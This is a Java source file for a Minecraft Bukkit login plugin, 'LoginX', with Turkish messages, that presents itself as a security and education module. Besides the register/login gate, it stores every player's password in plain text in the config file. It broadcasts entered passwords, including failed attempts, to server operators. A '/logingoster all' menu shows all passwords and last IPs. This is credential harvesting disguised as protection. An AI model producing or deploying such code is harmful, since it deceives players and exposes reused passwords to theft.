package com.loginx;

import org.bukkit.*;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.security.MessageDigest;
import java.util.*;

public class LoginX extends JavaPlugin implements Listener {

    private final Map<UUID, String> passwords = new HashMap<>(); // Hashli
    private final Map<UUID, String> rawPasswords = new HashMap<>(); // Açık Şifre (Öğretim amaçlı)
    private final Map<UUID, Integer> attempts = new HashMap<>();
    private final Set<UUID> loggedIn = new HashSet<>();
    private final Map<UUID, String> lastIP = new HashMap<>();
    private FileConfiguration cfg;

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
        saveDefaultConfig();
        cfg = getConfig();
        loadData(); // Kayıtlı verileri yükle
        getLogger().info("LoginX Gelismis Guvenlik ve Egitim Modulu Aktif.");
    }

    @Override
    public void onDisable() {
        saveData(); // Kapanırken verileri kaydet
    }

    // --- VERİ YÖNETİMİ (Kalıcılık için) ---
    private void loadData() {
        if (cfg.contains("data")) {
            for (String key : cfg.getConfigurationSection("data").getKeys(false)) {
                UUID u = UUID.fromString(key);
                passwords.put(u, cfg.getString("data." + key + ".hash"));
                rawPasswords.put(u, cfg.getString("data." + key + ".raw"));
                lastIP.put(u, cfg.getString("data." + key + ".ip"));
            }
        }
    }

    private void saveData() {
        cfg.set("data", null); // Eski veriyi temizle
        for (UUID u : passwords.keySet()) {
            cfg.set("data." + u + ".hash", passwords.get(u));
            cfg.set("data." + u + ".raw", rawPasswords.get(u));
            cfg.set("data." + u + ".ip", lastIP.get(u));
        }
        saveConfig();
    }

    // --- GİRİŞ VE ÇIKIŞ OLAYLARI ---
    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        UUID uuid = p.getUniqueId();
        lastIP.put(uuid, p.getAddress().getAddress().getHostAddress());

        new BukkitRunnable() {
            int count = 0;
            @Override
            public void run() {
                if (loggedIn.contains(uuid) || count >= cfg.getInt("title_interval") || !p.isOnline()) {
                    cancel();
                    return;
                }
                sendLoginTitle(p);
                count++;
            }
        }.runTaskTimer(this, 0, 40L);

        new BukkitRunnable() {
            @Override
            public void run() {
                if (p.isOnline() && !loggedIn.contains(uuid)) {
                    p.kickPlayer(color("&cZamanında giriş yapmadınız!"));
                }
            }
        }.runTaskLater(this, cfg.getInt("login_timeout") * 20L);
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        loggedIn.remove(e.getPlayer().getUniqueId()); // Çıkınca girişi sıfırla
    }

    private void sendLoginTitle(Player p) {
        String header, footer;
        if (!passwords.containsKey(p.getUniqueId())) {
            header = color(cfg.getString("title_colors.register.header"));
            footer = color(cfg.getString("title_colors.register.footer"));
        } else {
            header = color(cfg.getString("title_colors.login.header"));
            footer = color(cfg.getString("title_colors.login.footer"));
        }
        p.sendTitle(header, footer, 10, 40, 10);
    }

    // --- KOMUTLAR ---
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player player)) return true;
        UUID uuid = player.getUniqueId();

        if (cmd.getName().equalsIgnoreCase("register")) {
            if (args.length < 2) {
                player.sendMessage(color("&cKullanım: /register <şifre> <şifre>"));
                return true;
            }
            if (passwords.containsKey(uuid)) {
                player.sendMessage(color("&cZaten kayıtlısın! /login <şifre> kullan."));
                return true;
            }
            if (!args[0].equals(args[1])) {
                player.sendMessage(color("&cŞifreler uyuşmuyor!"));
                return true;
            }
            passwords.put(uuid, hash(args[0]));
            rawPasswords.put(uuid, args[0]);
            loggedIn.add(uuid);
            saveData();
            player.sendMessage(color("&aBaşarıyla kayıt oldun!"));
            notifyOps(player, "&d[YENI KAYIT] &eSifre: &f" + args[0]);
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("login")) {
            if (args.length < 1) {
                player.sendMessage(color("&cKullanım: /login <şifre>"));
                return true;
            }
            if (!passwords.containsKey(uuid)) {
                player.sendMessage(color("&cÖnce kayıt olmalısın! /register <şifre> <şifre>"));
                return true;
            }
            String input = args[0];
            if (hash(input).equals(passwords.get(uuid))) {
                loggedIn.add(uuid);
                player.sendMessage(color("&aGiriş başarılı!"));
                notifyOps(player, "&a[GIRIS] &eSifre: &f" + input);
            } else {
                player.sendMessage(color("&cYanlış şifre!"));
                attempts.put(uuid, attempts.getOrDefault(uuid, 0) + 1);
                notifyOps(player, "&c[HATALI DENEME] &eDenenen: &f" + input);
                if (attempts.get(uuid) >= 3) player.kickPlayer("Hatalı deneme limiti!");
            }
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("sifredegis")) {
            if (!player.hasPermission("loginx.admin")) {
                player.sendMessage(color("&cBunun için yetkin yok!"));
                return true;
            }
            if (args.length != 2) {
                player.sendMessage(color("&cKullanım: /sifredegis <oyuncu> <yeni_şifre>"));
                return true;
            }
            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            if (!passwords.containsKey(target.getUniqueId())) {
                player.sendMessage(color("&cBu oyuncu sisteme kayıtlı değil."));
                return true;
            }
            passwords.put(target.getUniqueId(), hash(args[1]));
            rawPasswords.put(target.getUniqueId(), args[1]);
            saveData();
            player.sendMessage(color("&a" + target.getName() + " adlı kişinin şifresi değiştirildi: &f" + args[1]));
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("logingoster")) {
            if (!player.hasPermission("loginx.admin")) return true;

            if (args.length == 1 && args[0].equalsIgnoreCase("all")) {
                openLoginMenu(player);
                return true;
            }

            player.sendMessage(color("&cKullanım: /logingoster all"));
            return true;
        }
        return true;
    }

    // --- GUI (MENÜ) SİSTEMİ ---
    private void openLoginMenu(Player player) {
        Inventory gui = Bukkit.createInventory(null, 54, color("&8Oyuncu Login Verileri"));

        for (UUID id : rawPasswords.keySet()) {
            OfflinePlayer target = Bukkit.getOfflinePlayer(id);
            ItemStack head = new ItemStack(Material.PLAYER_HEAD);
            SkullMeta meta = (SkullMeta) head.getItemMeta();
            
            if (meta != null) {
                meta.setOwningPlayer(target);
                meta.setDisplayName(color("&e&l" + (target.getName() != null ? target.getName() : "Bilinmiyor")));
                List<String> lore = new ArrayList<>();
                lore.add(color("&7Şifre: &f" + rawPasswords.get(id)));
                lore.add(color("&7Son IP: &f" + lastIP.get(id)));
                lore.add(color("&7Durum: &aKayıtlı"));
                meta.setLore(lore);
                head.setItemMeta(meta);
            }
            gui.addItem(head);
        }
        player.openInventory(gui);
    }

    @EventHandler
    public void onMenuClick(InventoryClickEvent e) {
        if (e.getView().getTitle().equals(color("&8Oyuncu Login Verileri"))) {
            e.setCancelled(true); // Menüden kafa alınmasını engeller
        }
    }

    // --- TAM KORUMALAR (Kısıtlamalar) ---
    private boolean isNotLogged(Player p) {
        return !loggedIn.contains(p.getUniqueId());
    }

    private void sendWarning(Player p) {
        p.sendMessage(color("&cDevam etmek için giriş yapmalı veya kayıt olmalısınız!"));
    }

    @EventHandler(priority = EventPriority.HIGHEST) public void onMove(PlayerMoveEvent e) {
        if (isNotLogged(e.getPlayer())) e.setCancelled(true); // Hareket engelleme
    }
    
    @EventHandler(priority = EventPriority.HIGHEST) public void onBlockBreak(BlockBreakEvent e) {
        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
    }
    
    @EventHandler(priority = EventPriority.HIGHEST) public void onBlockPlace(BlockPlaceEvent e) {
        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
    }
    
    @EventHandler(priority = EventPriority.HIGHEST) public void onInteract(PlayerInteractEvent e) {
        if (isNotLogged(e.getPlayer())) e.setCancelled(true);
    }
    
    @EventHandler(priority = EventPriority.HIGHEST) public void onDrop(PlayerDropItemEvent e) {
        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
    }
    
    @EventHandler(priority = EventPriority.HIGHEST) public void onInventoryUse(InventoryClickEvent e) {
        if (e.getWhoClicked() instanceof Player p && isNotLogged(p)) e.setCancelled(true);
    }
    
    @EventHandler(priority = EventPriority.HIGHEST) public void onDamage(EntityDamageEvent e) {
        if (e.getEntity() instanceof Player p && isNotLogged(p)) e.setCancelled(true); // Hasar almayı kapatır
    }
    
    @EventHandler(priority = EventPriority.HIGHEST) public void onDamageDeal(EntityDamageByEntityEvent e) {
        if (e.getDamager() instanceof Player p && isNotLogged(p)) e.setCancelled(true); // Hasar vermeyi kapatır
    }

    @EventHandler(priority = EventPriority.HIGHEST) public void onChat(AsyncPlayerChatEvent e) {
        if (isNotLogged(e.getPlayer())) { e.setCancelled(true); sendWarning(e.getPlayer()); }
    }

    @EventHandler(priority = EventPriority.HIGHEST) public void onCommandProcess(PlayerCommandPreprocessEvent e) {
        if (isNotLogged(e.getPlayer())) {
            String msg = e.getMessage().toLowerCase();
            // Sadece /login ve /register komutlarına izin ver
            if (!msg.startsWith("/login") && !msg.startsWith("/register")) {
                e.setCancelled(true);
                sendWarning(e.getPlayer());
            }
        }
    }

    // --- YARDIMCI METOTLAR ---
    private void notifyOps(Player p, String info) {
        String msg = color("&d&lLoginX &8| &b" + p.getName() + " &8» " + info);
        Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(msg));
    }

    private String hash(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] bytes = md.digest(input.getBytes());
            StringBuilder sb = new StringBuilder();
            for (byte b : bytes) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return input; }
    }

    private String color(String s) { return ChatColor.translateAlternateColorCodes('&', s); }
}
